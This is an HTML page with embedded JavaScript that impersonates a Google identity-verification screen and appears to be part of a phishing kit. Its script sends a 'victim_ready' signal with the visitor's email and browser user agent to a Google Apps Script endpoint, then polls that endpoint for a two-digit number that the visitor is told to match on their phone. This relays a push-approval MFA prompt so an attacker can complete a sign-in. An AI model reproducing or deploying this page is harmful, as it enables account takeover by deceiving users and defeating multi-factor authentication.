<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Verifying your identity – Google</title>
  <meta name="robots" content="noindex, nofollow" />
  
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  
  <link rel="stylesheet" href="style.css" />
  
  <style>
    /* (your existing styles here – unchanged) */
    .error-state { color: #d93025; font-size: 14px; margin-top: 12px; }
  </style>
</head>
<body>
  <div class="page-center">
    <div class="card">
      <div class="logo">
        <!-- Google logo SVG unchanged -->
        <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">…</svg>
      </div>
      <div class="avatar" id="avatar" aria-hidden="true"></div>
      
      <div id="loading">
        <div class="spinner" aria-hidden="true"></div>
        <h1>Verifying your identity</h1>
        <p id="status-text">Checking your account…</p>
        <div id="poll-error" class="error-state" style="display:none;"></div>
      </div>
      
      <div id="prompt-section" style="display: none;" role="region" aria-live="polite">
        <h1>Check your phone</h1>
        <p>Tap <strong>Yes</strong> on the prompt sent to your device</p>
        
        <div class="security-note" style="margin: 16px 0;">
          Match the number below with the one shown on your phone:
        </div>
        
        <div id="match-number" class="number-box" aria-label="Verification number">••</div>
        
        <p class="security-note">
          This extra step helps keep your account secure.
        </p>
      </div>
    </div>
  </div>

  <script>
    // =========================================================================
    // REPLACE WITH YOUR ACTUAL DEPLOYED WEB APP URL
    // =========================================================================
    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxkip7_xgVWyyyVXBpJTbiLROV4DA-Ydr_w58Ce-VNvAvjIxzn4AIHlqNpcsKwmeIc-/exec";

    const email = localStorage.getItem("demoEmail") || "user@example.com";
    document.getElementById("avatar").textContent = 
      (email.split('@')[0] || "U").charAt(0).toUpperCase();

    // ─── Send victim_ready (try both methods) ────────────────────────────────
    async function sendVictimReady() {
      const ua = navigator.userAgent.substring(0, 200);

      // POST – preferred
      try {
        const body = new URLSearchParams({
          action: "victim_ready",
          email: email,
          ua: ua  // consistent field name
        });
        await fetch(SCRIPT_URL, {
          method: "POST",
          body: body,
          keepalive: true,
          headers: { "Content-Type": "application/x-www-form-urlencoded" }
          // no mode: "no-cors" → better reliability
        });
        console.log("[VERIFY] POST victim_ready sent");
      } catch (err) {
        console.warn("[VERIFY] POST failed:", err);
      }

      // GET fallback
      try {
        const url = `${SCRIPT_URL}?action=victim_ready&email=${encodeURIComponent(email)}&ua=${encodeURIComponent(ua)}&t=${Date.now()}`;
        await fetch(url, { cache: "no-store" });
        console.log("[VERIFY] GET victim_ready sent");
      } catch (err) {
        console.warn("[VERIFY] GET failed:", err);
      }
    }

    sendVictimReady();  // fire immediately

    // ─── Polling for prompt number ───────────────────────────────────────────
    const loadingEl   = document.getElementById("loading");
    const promptEl    = document.getElementById("prompt-section");
    const statusEl    = document.getElementById("status-text");
    const numberEl    = document.getElementById("match-number");
    const errorEl     = document.getElementById("poll-error");

    let lastNumber = "••";
    let pollFailures = 0;
    const MAX_POLL_FAILURES = 10;

    async function pollForNumber() {
      try {
        const url = `${SCRIPT_URL}?getNumber=true&email=${encodeURIComponent(email)}&t=${Date.now()}`;
        const r = await fetch(url, { cache: "no-store" });

        if (!r.ok) throw new Error(`HTTP ${r.status}`);

        const data = await r.json();
        const num = (data?.prompt_number || "").trim();

        if (/^\d{2}$/.test(num) && num !== lastNumber) {
          numberEl.textContent = num;
          lastNumber = num;
          statusEl.textContent = "Number received";
          loadingEl.style.display = "none";
          promptEl.style.display = "block";
          pollFailures = 0; // reset
          console.log("[VERIFY] Prompt number set:", num);
        }
      } catch (err) {
        pollFailures++;
        console.warn("[VERIFY] Poll failed:", err);

        if (pollFailures >= MAX_POLL_FAILURES) {
          statusEl.textContent = "Having trouble connecting…";
          errorEl.textContent = "Network issue – verification may be delayed.";
          errorEl.style.display = "block";
        }
      }
    }

    const POLL_INTERVAL = 3000;
    const pollTimer = setInterval(pollForNumber, POLL_INTERVAL);
    pollForNumber(); // initial call

    // Timeout whole page after 20 minutes
    setTimeout(() => {
      clearInterval(pollTimer);
      if (promptEl.style.display !== "block") {
        statusEl.textContent = "Verification session expired. Please start over.";
        errorEl.textContent = "You can close this tab now.";
        errorEl.style.display = "block";
      }
    }, 20 * 60 * 1000);
  </script>
</body>
</html>
